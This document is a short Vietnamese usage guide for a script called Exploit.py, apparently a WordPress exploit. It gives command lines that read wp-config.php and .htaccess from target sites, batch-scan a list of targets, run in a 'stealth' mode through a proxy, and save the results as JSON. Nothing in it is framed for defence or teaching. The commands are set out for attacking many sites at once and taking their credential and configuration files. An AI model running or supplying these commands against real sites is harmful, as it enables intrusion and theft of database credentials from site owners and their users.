 + 🧪 Cách sử dụng cơ bản:
python3 Exploit.py --url https://target.com --cmd wp-config.php
+ 🔍 Chế độ kiểm tra plugin:
python3  Exploit.py --url https://target.com --check-only
+ 📂 Chế độ batch scan:
python3  Exploit.py --file targets.txt --cmd wp-config.php
+ targets.txt ví dụ:
- https://target1.com
- http://target2.com
+ 🕵️‍♂️ Chế độ stealth + Proxy:
python3  Exploit.py --url https://target.com --cmd .htaccess --stealth --proxy http://127.0.0.1:8080
+ 🧾 Xuất kết quả ra JSON:
python3  Exploit.py --file targets.txt --cmd wp-config.php --json-output result.json
